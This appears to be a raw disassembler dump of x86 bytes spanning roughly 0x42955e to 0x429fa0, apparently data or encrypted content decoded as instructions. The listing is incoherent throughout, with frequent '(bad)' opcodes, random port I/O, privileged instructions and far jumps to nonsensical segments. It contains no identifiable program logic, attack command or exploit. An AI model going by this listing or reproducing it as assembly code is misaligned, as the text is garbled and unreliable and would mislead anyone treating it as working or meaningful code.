  42955e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42955f:	xor    BYTE PTR [edx],cl
  429561:	and    edx,DWORD PTR [ebp+0x7723ec4a]
  429567:	inc    esp
  429568:	(bad)  
  429569:	aam    0xd3
  42956b:	hlt    
  42956c:	xor    eax,0x9685d21
  429571:	adc    al,0x7d
  429573:	jecxz  0x42950c
  429575:	ja     0x4295d3
  429577:	mov    ch,0x4a
  429579:	adc    edx,esp
  42957b:	nop
  42957c:	out    dx,eax
  42957d:	fimul  WORD PTR [edi]
  42957f:	(bad)  
  429580:	sti    
  429581:	bound  ecx,QWORD PTR [ebx+0x3443bac5]
  429587:	fimul  WORD PTR [eax+ebp*2+0x4d43c70b]
  42958e:	adc    BYTE PTR [ecx],ch
  429590:	pusha  
  429591:	out    0xce,eax
  429593:	mov    ebx,0x2c0f0a
  429598:	jg     0x4295d7
  42959a:	rcr    ecx,1
  42959c:	xor    BYTE PTR [ebx-0x74183c9],ah
  4295a2:	sar    DWORD PTR [edi+0x70],cl
  4295a5:	and    eax,0xbd3a7d3e
  4295aa:	fidivr WORD PTR [ebp+0xafc96d6]
  4295b0:	jo     0x429619
  4295b2:	mov    dh,0x0
  4295b4:	retf   0x8291
  4295b7:	xor    ebx,0x7d1d4203
  4295bd:	arpl   bp,bx
  4295bf:	mov    dl,bh
  4295c1:	sbb    DWORD PTR [esi+eax*1+0x43],0xffffffb5
  4295c6:	mov    al,0x9
  4295c8:	mov    bh,0x83
  4295ca:	mov    al,0xcb
  4295cc:	in     al,dx
  4295cd:	ror    DWORD PTR [ecx],0x5a
  4295d0:	ror    DWORD PTR [eax],cl
  4295d2:	inc    ebp
  4295d3:	sub    al,0x45
  4295d5:	xor    ebp,DWORD PTR [edx-0x1a83fbe]
  4295db:	hlt    
  4295dc:	scas   eax,DWORD PTR es:[edi]
  4295dd:	add    DWORD PTR [edx+0x6d],0xaac551ad
  4295e4:	adc    eax,0xe89548bb
  4295e9:	mov    bh,0xb8
  4295eb:	outs   dx,DWORD PTR ds:[esi]
  4295ec:	inc    ebp
  4295ed:	rol    BYTE PTR [edi+0x45],0xa3
  4295f1:	push   edi
  4295f2:	(bad)  
  4295f3:	jns    0x42963f
  4295f5:	add    al,0x7b
  4295f7:	mov    ch,0x82
  4295f9:	pop    ecx
  4295fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295fb:	mov    bl,0xf0
  4295fd:	dec    ebp
  4295fe:	fisttp WORD PTR [ecx+0x2fcc14dc]
  429604:	add    eax,0x3d8c5f34
  429609:	jnp    0x42961d
  42960b:	leave  
  42960c:	cs mov dl,0x24
  42960f:	mov    eax,DWORD PTR [eax]
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	mov    ch,0x4a
  429682:	adc    eax,DWORD PTR [edi]
  429684:	jo     0x429640
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	rol    DWORD PTR [ecx+0x36],1
  42968f:	push   edi
  429690:	adc    BYTE PTR [edx+0x2],dl
  429693:	(bad)  
  429694:	ja     0x4296c0
  429696:	mov    edx,0x93b1a1f3
  42969b:	test   BYTE PTR [esi+0x26],dl
  42969e:	pop    esp
  42969f:	adc    al,0x66
  4296a1:	addr16 mov eax,ds:0x95ff
  4296a5:	cdq    
  4296a6:	and    BYTE PTR [ebp-0x1f61f3e4],cl
  4296ac:	xchg   ebx,eax
  4296ad:	fdivrp st(4),st
  4296af:	cmp    eax,0xdda3b85d
  4296b4:	cdq    
  4296b5:	sar    DWORD PTR [esi-0x688fb15e],cl
  4296bb:	sti    
  4296bc:	pop    ebx
  4296bd:	in     eax,dx
  4296be:	push   es
  4296bf:	ins    BYTE PTR es:[edi],dx
  4296c0:	rcl    BYTE PTR [ebp+0x7566f3f2],1
  4296c6:	jg     0x4296f6
  4296c8:	data16 jle 0x429670
  4296cb:	add    eax,0x2dae8003
  4296d0:	xor    al,0x94
  4296d2:	jno    0x42974b
  4296d4:	sbb    al,0xad
  4296d6:	adc    al,0xc4
  4296d8:	cli    
  4296d9:	lea    ebx,[eax-0x2db55689]
  4296df:	mov    esp,0x84e0632e
  4296e4:	sub    edx,DWORD PTR [esi+eax*4]
  4296e7:	add    eax,0x505bd81b
  4296ec:	jl     0x429697
  4296ee:	inc    esp
  4296ef:	fsub   QWORD PTR [ebp-0x6b]
  4296f2:	jmp    0x4296df
  4296f4:	mov    cs,WORD PTR [ebp-0x507f02a3]
  4296fa:	or     edx,DWORD PTR [esp+ecx*1-0x35f23870]
  429701:	xchg   eax,edx
  429703:	push   cs
  429704:	xchg   edi,eax
  429705:	push   eax
  429706:	stc    
  429707:	rcr    BYTE PTR es:[esi-0x48],1
  42970b:	sbb    ecx,esi
  42970d:	stos   DWORD PTR es:[edi],eax
  42970e:	arpl   WORD PTR [edi+esi*4],sp
  429711:	sub    eax,0xbe6f823d
  429716:	data16 out 0xb9,al
  429719:	jb     0x42971d
  42971b:	xor    DWORD PTR [edi],ecx
  42971d:	out    0x81,al
  42971f:	xchg   edx,eax
  429720:	jecxz  0x42972c
  429722:	jb     0x429752
  429724:	adc    cl,BYTE PTR [esi]
  429726:	jne    0x429720
  429728:	push   ecx
  429729:	and    ah,BYTE PTR [eax]
  42972b:	inc    edi
  42972c:	hlt    
  42972d:	xchg   esp,eax
  42972e:	pop    edx
  42972f:	cmp    bl,ch
  429731:	sub    eax,ecx
  429733:	or     dl,BYTE PTR [ecx+0x7c]
  429736:	mov    bh,0xee
  429738:	clc    
  429739:	or     ah,BYTE PTR [ecx]
  42973b:	arpl   cx,bp
  42973d:	mov    ecx,0x1cc20e78
  429742:	add    eax,0xd1d273c7
  429747:	out    dx,al
  429748:	call   0x8ce3cd91
  42974d:	ficom  WORD PTR [esp+eax*1]
  429750:	mov    cl,al
  429752:	aas    
  429753:	pop    ecx
  429754:	sbb    eax,0x25d8135d
  429759:	xor    edi,DWORD PTR [eax+edi*2-0x3c]
  42975d:	mov    al,BYTE PTR [edx-0x4fc557a2]
  429763:	push   eax
  429764:	or     al,BYTE PTR ds:0x1f8c8a98
  42976a:	and    al,0xcf
  42976c:	ror    BYTE PTR [ebx+0x294671a],cl
  429772:	xchg   DWORD PTR [eax-0x4d],ecx
  429775:	pop    ebp
  429776:	pop    ecx
  429777:	sub    eax,0xf58ebd24
  42977c:	fild   DWORD PTR [ebx+0x45e784f7]
  429782:	dec    ebx
  429783:	clc    
  429784:	syscall 
  429786:	mov    ebx,0x6447b367
  42978b:	dec    ecx
  42978c:	jmp    0x4297ae
  42978e:	fwait
  42978f:	hlt    
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	daa    
  429801:	lods   eax,DWORD PTR ds:[esi]
  429802:	jae    0x4297cc
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	adc    esp,DWORD PTR [edx+0x360e33a4]
  429812:	not    DWORD PTR [edx+0x22389b5c]
  429818:	push   esi
  429819:	add    eax,0x54ba30c9
  42981e:	jnp    0x4297d0
  429820:	aam    0x7d
  429822:	adc    al,0xd2
  429824:	mov    ah,0xe6
  429826:	or     BYTE PTR [ecx],bh
  429828:	fwait
  429829:	(bad)  
  42982a:	daa    
  42982b:	adc    edx,DWORD PTR [eax]
  42982d:	ss aas 
  42982f:	jg     0x4298a8
  429831:	cs pop esi
  429833:	rcr    BYTE PTR [eax-0x12],1
  429836:	dec    ebx
  429837:	mov    bl,0x62
  429839:	add    bl,BYTE PTR [eax+0x4f]
  42983c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42983d:	jl     0x4298b2
  42983f:	pop    es
  429840:	out    dx,eax
  429841:	retf   0x388e
  429844:	or     BYTE PTR [edx+0x45],cl
  429847:	daa    
  429848:	jle    0x42980f
  42984a:	(bad)  
  42984b:	ins    DWORD PTR es:[edi],dx
  42984c:	xor    DWORD PTR [eax+0x55476775],ebp
  429852:	fstp   DWORD PTR [ebx+0x40c0cdcf]
  429858:	leave  
  429859:	cmc    
  42985a:	xchg   esp,eax
  42985b:	jb     0x4297e6
  42985d:	inc    edi
  42985e:	dec    DWORD PTR [edx-0x59]
  429861:	dec    esi
  429862:	and    ecx,DWORD PTR [ebp+edi*2+0x7d]
  429866:	push   eax
  429867:	sbb    al,0xeb
  429869:	fwait
  42986a:	(bad)  
  42986b:	aad    0xbd
  42986d:	sbb    BYTE PTR [eax+0x53],al
  429870:	inc    edi
  429871:	es dec ebx
  429873:	fcom   QWORD PTR [ebx]
  429875:	sub    bh,bh
  429877:	dec    edi
  429878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429879:	push   edi
  42987a:	jno    0x42989b
  42987c:	jnp    0x42989c
  42987e:	mov    dl,0x2f
  429880:	sub    ebx,edx
  429882:	pop    edx
  429883:	daa    
  429884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429885:	scas   eax,DWORD PTR es:[edi]
  429886:	into   
  429887:	lds    ebx,FWORD PTR [ebx]
  429889:	fisttp DWORD PTR [ebx]
  42988b:	xchg   edx,eax
  42988c:	dec    edx
  42988d:	retf   
  42988e:	repnz push es
  429890:	in     al,0x76
  429892:	pop    ss
  429893:	adc    al,0x8c
  429895:	sahf   
  429896:	clc    
  429897:	sbb    eax,0x757613b6
  42989c:	adc    dl,BYTE PTR [edx-0x49a557d4]
  4298a2:	cmp    DWORD PTR [ebp+0x599c8ed2],ebx
  4298a8:	dec    esp
  4298a9:	and    BYTE PTR ds:0x927e3ed7,cl
  4298af:	jae    0x4298f2
  4298b1:	xchg   esi,esi
  4298b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298b4:	sbb    BYTE PTR [ecx+0x3552e38b],ah
  4298ba:	jne    0x429871
  4298bc:	push   ebp
  4298bd:	loopne 0x4298af
  4298bf:	mov    fs,WORD PTR [ecx-0x2c1a72d2]
  4298c5:	inc    ecx
  4298c6:	or     BYTE PTR [eax-0x27b81286],0xf4
  4298cd:	dec    ebx
  4298ce:	mov    ah,al
  4298d0:	hlt    
  4298d1:	mov    esp,esp
  4298d3:	jns    0x429894
  4298d5:	mov    ds:0xcd121315,al
  4298da:	repnz pop edi
  4298dc:	push   ss
  4298dd:	test   eax,0xb854ff67
  4298e2:	inc    ecx
  4298e3:	rcl    BYTE PTR [ecx],0xf2
  4298e6:	sub    DWORD PTR [ebp+0x2d],esi
  4298e9:	das    
  4298ea:	mov    edx,DWORD PTR [ebx+esi*4]
  4298ed:	test   eax,0x2c6dea76
  4298f2:	jp     0x429886
  4298f4:	outs   dx,DWORD PTR ds:[esi]
  4298f5:	cmp    edx,DWORD PTR [edx+0x69159a68]
  4298fb:	pmullw mm0,QWORD PTR [ebp+0x77]
  4298ff:	pop    esp
  429900:	jmp    0x429951
  429902:	in     al,0x53
  429904:	add    esi,edx
  429906:	mov    esp,DWORD PTR [ebp+0x54134c39]
  42990c:	lea    edx,[esi+0x910c]
	...
  429972:	add    BYTE PTR [eax],al
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	sub    bh,ah
  429982:	xlat   BYTE PTR ds:[ebx]
  429983:	fidivr DWORD PTR [eax-0x44]
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	cmp    ch,BYTE PTR [ecx]
  42998e:	cmp    BYTE PTR [ecx-0x64],ch
  429991:	in     eax,0x6d
  429993:	fstp   st(7)
  429995:	adc    BYTE PTR [edi-0xdcd13d3],al
  42999b:	stos   BYTE PTR es:[edi],al
  42999c:	out    dx,al
  42999d:	sbb    eax,0xa3610182
  4299a2:	frstor [edx+0x48]
  4299a5:	adc    edi,DWORD PTR [edi+0x6a]
  4299a8:	fst    QWORD PTR [ebp-0x69c738df]
  4299ae:	xor    al,dl
  4299b0:	or     bh,0xeb
  4299b3:	retf   
  4299b4:	int    0xd
  4299b6:	pop    ebx
  4299b7:	loopne 0x4299f8
  4299b9:	shl    DWORD PTR ds:0x6c4adefb,cl
  4299bf:	xchg   DWORD PTR [edx+0x6c],ebp
  4299c2:	mov    ch,0x48
  4299c4:	pop    ebp
  4299c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299c6:	cmp    edx,DWORD PTR ds:0xadd8b7e0
  4299cc:	dec    edi
  4299cd:	mov    bh,0x26
  4299cf:	fwait
  4299d0:	adc    ch,BYTE PTR [ecx]
  4299d2:	pushf  
  4299d3:	fwait
  4299d4:	mov    edx,0xbe84b727
  4299d9:	xchg   ebp,eax
  4299da:	sti    
  4299db:	and    BYTE PTR [eax-0x711b9d25],al
  4299e1:	mov    ebx,0x8c3942c
  4299e6:	pusha  
  4299e7:	cmp    BYTE PTR [edx-0x4f8aaaf8],ch
  4299ed:	jl     0x429a3f
  4299ef:	sub    al,0x77
  4299f1:	shl    DWORD PTR [ebx+0x5ffa262f],1
  4299f7:	adc    ch,BYTE PTR [esp+esi*8-0x63]
  4299fb:	ds pusha 
  4299fd:	adc    eax,DWORD PTR [ebx]
  4299ff:	in     al,0xf0
  429a01:	shl    BYTE PTR ds:0xb5bb54bf,cl
  429a07:	fdivr  QWORD PTR [eax]
  429a09:	mov    dl,0xe8
  429a0b:	icebp  
  429a0c:	dec    esp
  429a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a0e:	pop    ecx
  429a0f:	jle    0x429a10
  429a11:	jp     0x429a28
  429a13:	xor    ch,cl
  429a15:	add    BYTE PTR [edi-0x26],0x97
  429a19:	fs jo  0x4299dc
  429a1c:	loop   0x429a1d
  429a1e:	in     eax,0xf5
  429a20:	lods   al,BYTE PTR ds:[esi]
  429a21:	iret   
  429a22:	fnsave [edi+0x30]
  429a25:	(bad)  
  429a26:	xchg   edi,eax
  429a27:	sub    BYTE PTR [ebp-0x33],al
  429a2a:	sub    al,al
  429a2c:	adc    eax,DWORD PTR [eax+0x27]
  429a2f:	mov    ah,0x88
  429a31:	lods   al,BYTE PTR ds:[esi]
  429a32:	jo     0x429a3b
  429a34:	in     eax,dx
  429a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a36:	pop    ecx
  429a37:	xchg   ecx,eax
  429a38:	shr    BYTE PTR [edx+edx*1],0x93
  429a3c:	inc    ecx
  429a3d:	xchg   esi,eax
  429a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a3f:	push   edi
  429a40:	xchg   edi,eax
  429a41:	retf   0x78f6
  429a44:	sbb    ecx,DWORD PTR [ecx+0x662b117e]
  429a4a:	push   edi
  429a4b:	dec    edi
  429a4c:	mov    ds:0x44829099,al
  429a51:	mov    cl,0x4d
  429a53:	cwde   
  429a54:	add    al,BYTE PTR [edi+ebx*2]
  429a57:	cmc    
  429a58:	hlt    
  429a59:	in     al,0x89
  429a5b:	mov    dl,BYTE PTR [ecx]
  429a5d:	pop    edx
  429a5e:	lods   al,BYTE PTR ds:[esi]
  429a5f:	inc    esi
  429a60:	loope  0x429a5e
  429a62:	sub    dh,BYTE PTR [eax+0x6c]
  429a65:	jmp    0x8e95:0x8b35fdb
  429a6c:	in     al,dx
  429a6d:	push   ebx
  429a6e:	mov    ebx,0x5397e3d8
  429a73:	(bad)  
  429a74:	imul   edx,DWORD PTR [esi+0x42],0xfc7a95da
  429a7b:	mov    dl,0x77
  429a7d:	call   0x6f9a:0xbebd6b59
  429a84:	or     BYTE PTR [ebx-0x45de7be6],0x3e
  429a8b:	dec    esi
  429a8c:	or     al,0xe
  429a8e:	arpl   WORD PTR [esi+0x0],dx
	...
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x2ca95667
  429b01:	ss push 0x1bd7cfe
  429b07:	add    BYTE PTR [ecx+eax*1],al
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	retf   0xaf25
  429b0f:	popa   
  429b10:	jl     0x429b54
  429b12:	(bad)  
  429b13:	into   
  429b14:	xchg   esi,eax
  429b15:	mov    al,0x5b
  429b17:	jge    0x429b2c
  429b19:	sbb    ebx,DWORD PTR [edi+0x19c27f0]
  429b1f:	and    eax,0x29961b8d
  429b24:	xlat   BYTE PTR ds:[ebx]
  429b25:	xchg   DWORD PTR [ebp-0x3806c1dd],ebx
  429b2b:	mov    eax,0xf7af2b47
  429b30:	in     al,0xdb
  429b32:	sbb    bh,BYTE PTR ds:0x726557ba
  429b38:	mov    edi,DWORD PTR [esi+0x1f]
  429b3b:	or     al,0xd
  429b3d:	sub    BYTE PTR [ebx],ch
  429b3f:	inc    edx
  429b40:	push   edx
  429b41:	mov    es,WORD PTR [ebx+0x39]
  429b44:	xor    esp,ecx
  429b46:	inc    esi
  429b47:	pop    ecx
  429b48:	adc    cl,BYTE PTR [bx+0x4a]
  429b4c:	adc    ch,BYTE PTR [ebp+0x14]
  429b4f:	mov    ds:0x24164e36,al
  429b54:	or     ch,bh
  429b56:	fs das 
  429b58:	mov    es,WORD PTR [edi]
  429b5a:	pushf  
  429b5b:	jnp    0x429b59
  429b5d:	cmc    
  429b5e:	and    eax,DWORD PTR [ebp+0xbdc507b]
  429b64:	sbb    ebp,DWORD PTR [ebx+0x50]
  429b67:	or     bl,BYTE PTR [edx+edx*1+0x65]
  429b6b:	pop    ebx
  429b6c:	jecxz  0x429be3
  429b6e:	and    DWORD PTR [esi+0x47],esi
  429b71:	test   al,0xf1
  429b73:	inc    eax
  429b74:	mov    ?,esp
  429b76:	test   eax,0x11f6a6fa
  429b7b:	mov    ah,0xda
  429b7d:	sub    DWORD PTR [eax],esp
  429b7f:	pop    ebp
  429b80:	sub    DWORD PTR [ebx],edx
  429b82:	outs   dx,BYTE PTR ds:[esi]
  429b83:	push   es
  429b84:	fimul  WORD PTR [ecx+0x3defd1b3]
  429b8a:	mov    eax,0xc26b4fb4
  429b8f:	inc    eax
  429b90:	mov    ch,0x97
  429b92:	retf   
  429b93:	lods   eax,DWORD PTR ds:[esi]
  429b94:	inc    esp
  429b95:	dec    ebp
  429b96:	inc    ebp
  429b97:	jp     0x429c12
  429b99:	aaa    
  429b9a:	or     DWORD PTR [edi],edi
  429b9c:	adc    edx,eax
  429b9e:	test   BYTE PTR [ecx+ecx*2+0x221209b1],bh
  429ba5:	xchg   edi,eax
  429ba6:	ds mov ch,0xdd
  429ba9:	das    
  429baa:	mov    fs,WORD PTR [esi-0xb]
  429bad:	push   ss
  429bae:	fdivr  QWORD PTR [eax+0x7c]
  429bb1:	call   0x183bcb2d
  429bb6:	cwde   
  429bb7:	scas   eax,DWORD PTR es:[edi]
  429bb8:	fsubp  st(2),st
  429bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bbb:	inc    edx
  429bbc:	in     al,0x99
  429bbe:	cdq    
  429bbf:	sub    BYTE PTR [edx+0x4d],bh
  429bc2:	sbb    DWORD PTR [eax],edi
  429bc4:	int    0xb5
  429bc6:	call   0xcd29b320
  429bcb:	or     bl,BYTE PTR [ebx+0x567504ab]
  429bd1:	repnz call 0x1bfa:0x4d09f890
  429bd9:	sub    dh,BYTE PTR [edx-0x47]
  429bdc:	ror    BYTE PTR [edx],1
  429bde:	pop    esi
  429bdf:	inc    esp
  429be0:	int3   
  429be1:	leave  
  429be2:	fidivr WORD PTR [ebp-0x146e7adb]
  429be8:	loop   0x429c3b
  429bea:	push   0xb7386a1e
  429bef:	pop    edx
  429bf0:	or     eax,0x761f7227
  429bf5:	cwde   
  429bf6:	mov    bl,0x6b
  429bf8:	xor    eax,0x77e36afc
  429bfd:	nop
  429bfe:	mov    ebx,0x2895f666
  429c03:	ret    0xe06f
  429c06:	cmp    BYTE PTR [esi-0x696592ff],bh
  429c0c:	add    eax,0xaf1881
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ebx-0x7ff3d9e5],ch
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	adc    al,0xcd
  429c8e:	adc    dl,BYTE PTR [eax+0x4ba905a0]
  429c94:	pusha  
  429c95:	jbe    0x429cce
  429c97:	add    DWORD PTR [edi],edi
  429c99:	sbb    bl,bh
  429c9b:	clc    
  429c9c:	or     al,ah
  429c9e:	cmp    al,0xf7
  429ca0:	pop    es
  429ca1:	pop    ds
  429ca2:	xchg   ebx,eax
  429ca3:	iret   
  429ca4:	pushf  
  429ca5:	pop    es
  429ca6:	or     eax,0x6503c96b
  429cab:	push   ss
  429cac:	mov    ds:0xa4d30259,al
  429cb1:	nop
  429cb2:	or     eax,0xa0a46f10
  429cb7:	mov    ebp,0x77beb096
  429cbc:	mov    DWORD PTR [ebx+0x6f],ecx
  429cbf:	loop   0x429c6a
  429cc1:	leave  
  429cc2:	jmp    0x429c44
  429cc4:	xchg   esp,eax
  429cc5:	cwde   
  429cc6:	sbb    al,0x27
  429cc8:	xor    dl,dl
  429cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ccb:	in     eax,0xc4
  429ccd:	repnz mov dl,BYTE PTR [ecx-0x50]
  429cd1:	push   cs
  429cd2:	jo     0x429c7a
  429cd4:	cmp    edi,DWORD PTR [ebx+0x3]
  429cd7:	dec    BYTE PTR [esp+ebp*8]
  429cda:	(bad)  [ebx]
  429cdc:	int    0x74
  429cde:	mov    esp,DWORD PTR [eax+0x3a]
  429ce1:	sbb    ch,ch
  429ce3:	push   edx
  429ce4:	mov    dl,0x22
  429ce6:	inc    esp
  429ce7:	outs   dx,DWORD PTR ds:[esi]
  429ce8:	xchg   BYTE PTR [ebp+0x410a01d2],bl
  429cee:	into   
  429cef:	push   es
  429cf0:	ret    
  429cf1:	jmp    0xbe011249
  429cf6:	pop    ebx
  429cf7:	adc    eax,0x54a75e97
  429cfc:	ins    DWORD PTR es:[edi],dx
  429cfd:	jmp    0xe14:0xd37a64a4
  429d04:	mov    ebp,0xdac3693b
  429d09:	pextrw edi,(bad),0xc5
  429d0b:	cmp    bh,BYTE PTR [edx]
  429d0d:	mov    esp,0xce6bac0f
  429d12:	mov    cl,0x83
  429d14:	cmp    DWORD PTR [esi-0x7f],esi
  429d17:	mov    esp,0xc1c0dc42
  429d1c:	push   edx
  429d1d:	out    dx,eax
  429d1e:	test   DWORD PTR [esi-0x39048a8e],esi
  429d24:	pop    ecx
  429d25:	mov    al,ds:0x70a47c68
  429d2a:	cmp    DWORD PTR [edi-0x5a3ffb99],esi
  429d30:	outs   dx,DWORD PTR ds:[esi]
  429d31:	add    ebp,DWORD PTR ds:0x1f8f0aa9
  429d37:	inc    esp
  429d38:	or     al,0x11
  429d3a:	(bad)  
  429d3b:	imul   ebp,DWORD PTR [ebp-0x486dad85],0xd5de100a
  429d45:	ja     0x429d5f
  429d47:	fs imul esi,esp,0xffffffd4
  429d4b:	pop    ecx
  429d4c:	ins    BYTE PTR es:[edi],dx
  429d4d:	inc    ecx
  429d4e:	push   edx
  429d4f:	pushf  
  429d50:	xchg   edx,eax
  429d51:	test   dl,bh
  429d53:	inc    edi
  429d54:	test   bl,bl
  429d56:	mov    bh,0xd8
  429d58:	(bad)  
  429d59:	xor    al,0x9b
  429d5b:	test   BYTE PTR [edi+0x2deb3dcc],ah
  429d61:	scas   al,BYTE PTR es:[edi]
  429d62:	call   0xdcc3:0xd9af6743
  429d69:	xchg   ebp,edx
  429d6b:	dec    esp
  429d6c:	cdq    
  429d6d:	and    eax,0x951d5bbc
  429d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d73:	xchg   esp,eax
  429d74:	adc    eax,0xd84890f6
  429d79:	or     BYTE PTR ds:0xc4ae2040,dl
  429d7f:	mov    cl,0x38
  429d81:	and    BYTE PTR [esi],0x9
  429d84:	and    al,BYTE PTR [edi]
  429d86:	adc    ch,BYTE PTR [esi]
  429d88:	mov    al,BYTE PTR [ecx-0x21]
  429d8b:	add    ebx,esi
  429d8d:	xor    al,0xe2
  429d8f:	push   esi
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	jns    0x429e57
  429e02:	and    al,0xc1
  429e04:	test   BYTE PTR [edi+0x1040001],bh
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	(bad)  
  429e0d:	jecxz  0x429e41
  429e0f:	mov    esi,0xfaa652d8
  429e14:	xor    ebp,edi
  429e16:	push   ecx
  429e17:	mov    bh,0x25
  429e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e1a:	fcom   QWORD PTR ss:[edi]
  429e1d:	add    eax,DWORD PTR [edx+0x79]
  429e20:	scas   al,BYTE PTR es:[edi]
  429e21:	push   esi
  429e22:	in     al,dx
  429e23:	pusha  
  429e24:	mov    dl,0xe6
  429e26:	fiadd  WORD PTR [edx+0x74f0e3e8]
  429e2c:	ja     0x429dd7
  429e2e:	enter  0x43a7,0x46
  429e32:	(bad)  
  429e33:	sub    dl,BYTE PTR [eax-0x218b9aa7]
  429e39:	add    al,cl
  429e3b:	pop    edx
  429e3c:	imul   DWORD PTR [ebx+esi*4]
  429e3f:	fld    DWORD PTR [ebp+esi*4-0x17]
  429e43:	repnz cmp cl,BYTE PTR [ecx-0x57a73eac]
  429e4a:	xchg   esp,eax
  429e4b:	xor    dl,BYTE PTR [ebx+0x65c1dac7]
  429e51:	or     ah,BYTE PTR [ecx+0x428939e1]
  429e57:	into   
  429e58:	out    0x19,eax
  429e5a:	sub    ecx,DWORD PTR [ebx-0x1d]
  429e5d:	mov    al,0xe1
  429e5f:	rcr    BYTE PTR [edi],cl
  429e61:	stos   DWORD PTR es:[edi],eax
  429e62:	inc    esi
  429e63:	rcl    DWORD PTR [edi+0x8],cl
  429e66:	push   edx
  429e67:	icebp  
  429e68:	sti    
  429e69:	inc    ecx
  429e6a:	sbb    bh,BYTE PTR [edx+edx*8-0x24]
  429e6e:	inc    edi
  429e6f:	adc    edi,DWORD PTR [ebp+0x2beb97a8]
  429e75:	and    esp,0xffffffa4
  429e78:	cmp    DWORD PTR [ebx+ebp*4],edi
  429e7b:	call   0xd14f:0xb9e49868
  429e82:	sub    BYTE PTR [edi+0x42eb867c],0xd4
  429e89:	loope  0x429ebe
  429e8b:	retf   0xb7c5
  429e8e:	fiadd  WORD PTR [ebx-0x64]
  429e91:	inc    esp
  429e92:	loope  0x429e46
  429e94:	ret    0xf826
  429e97:	(bad)  
  429e99:	ret    
  429e9a:	popf   
  429e9b:	or     esi,esi
  429e9d:	es jns 0x429eef
  429ea0:	and    eax,0x3cabf765
  429ea5:	adc    edi,DWORD PTR [eax-0x6569aad5]
  429eab:	and    bl,BYTE PTR [ecx+ecx*4+0x4a191808]
  429eb2:	aaa    
  429eb3:	(bad)  
  429eb4:	mov    ds:0x27ca137c,eax
  429eb9:	ins    DWORD PTR es:[edi],dx
  429eba:	aad    0xf3
  429ebc:	les    esp,FWORD PTR [eax]
  429ebe:	fisubr WORD PTR [esi+0x56]
  429ec1:	sub    al,0xaa
  429ec3:	dec    esi
  429ec4:	test   DWORD PTR [ebp+0x741fe8a4],edx
  429eca:	out    0xa3,al
  429ecc:	cmp    al,0xff
  429ece:	test   DWORD PTR [ecx-0x46fd84a5],ebp
  429ed4:	call   0x673:0x3420600c
  429edb:	out    0x72,eax
  429edd:	loopne 0x429ef5
  429edf:	jmp    0x9d596400
  429ee4:	mov    dl,0xce
  429ee6:	shr    BYTE PTR [edi+esi*8+0x13],cl
  429eea:	add    esp,edx
  429eec:	sub    ebp,eax
  429eee:	nop
  429eef:	call   0x21050c28
  429ef4:	push   cs
  429ef5:	rcr    ebp,1
  429ef7:	pop    edx
  429ef8:	mov    DWORD PTR [esi+0x6f],eax
  429efb:	das    
  429efc:	dec    edi
  429efd:	jnp    0x429f3e
  429eff:	lods   eax,DWORD PTR ds:[esi]
  429f00:	cmc    
  429f01:	and    bh,BYTE PTR [ebx+edi*4+0x79]
  429f05:	out    dx,al
  429f06:	(bad)  
  429f09:	fsubp  st(5),st
  429f0b:	mov    BYTE PTR [ebp+0x8c8102],bl
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x1fec76f]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	dec    ebx
  429f8d:	mov    al,ds:0x671602ca
  429f92:	ins    DWORD PTR es:[edi],dx
  429f93:	ja     0x42a008
  429f95:	(bad)  
  429f98:	daa    
  429f99:	push   0xffffff98
  429f9b:	stos   BYTE PTR es:[edi],al
  429f9c:	(bad)  
  429f9d:	(bad)  
  429f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fa0:	shr    BYTE PTR [ebx-0x10],cl
